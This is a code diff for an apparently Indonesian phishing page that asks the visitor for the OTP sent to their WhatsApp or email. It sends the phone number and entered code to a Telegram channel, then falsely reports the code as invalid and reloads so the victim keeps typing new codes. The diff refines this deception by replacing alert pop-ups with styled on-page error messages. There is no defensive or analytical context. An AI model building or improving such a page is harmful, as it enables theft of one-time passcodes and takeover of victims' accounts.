@@ -24,7 +24,7 @@
     <p class="text-center text-base max-w-xs leading-snug" id="otp-instruction">
       Masukkan kode yang dikirim ke <strong id="phone-number"></strong><br />
       <strong>(WhatsApp)</strong><br />
-      and <strong>**********@gmail.com</strong>
+      atau <strong>**********@gmail.com</strong>
     </p>
 
     <form id="otp-form" class="mt-10 flex justify-center gap-6 max-w-xs w-full" autocomplete="off" novalidate>
@@ -73,6 +73,8 @@
         pattern="\d"
       />
     </form>
+
+    <p id="message" class="mt-6 text-center text-lg font-semibold"></p>
   </main>
 
   <footer class="p-5 text-center">
@@ -102,7 +104,7 @@
     const timerInterval = setInterval(updateTimer, 1000);
 
     // Get phone number from previous page via URL query parameter "phone"
-    // Example URL: currentpage.html?phone=%2B62-8*******
+    // Example URL: currentpage.html?phone=%2B62-822-2***-6617
     function getPhoneNumberFromURL() {
       const params = new URLSearchParams(window.location.search);
       return params.get('phone');
@@ -140,6 +142,7 @@
     // Handle auto-submit when all 4 inputs are filled
     const form = document.getElementById('otp-form');
     const inputs = form.querySelectorAll('input');
+    const messageEl = document.getElementById('message');
 
     inputs.forEach((input, idx) => {
       input.addEventListener('input', async () => {
@@ -159,11 +162,15 @@
           const message = `Kode OTP diterima:\nNomor Telepon: ${phone}\nKode: ${otpCode}`;
           const success = await sendToTelegram(message);
           if (success) {
-            alert('Kode OTP Tidak Valid.');
-            window.location.href = "otp.html";
+          window.location.href = "otp.html";
+            messageEl.textContent = 'Kode OTP Tidak Valid';
+            messageEl.classList.remove('text-gray-700');
+            messageEl.classList.add('text-red-600');
             form.reset();
           } else {
-            alert('Gagal mengirim kode OTP ke Telegram.');
+            messageEl.textContent = 'Gagal mengirim kode OTP ke Telegram.';
+            messageEl.classList.remove('text-red-600');
+            messageEl.classList.add('text-gray-700');
           }
           inputs.forEach(i => i.disabled = false);
           inputs[0].focus();
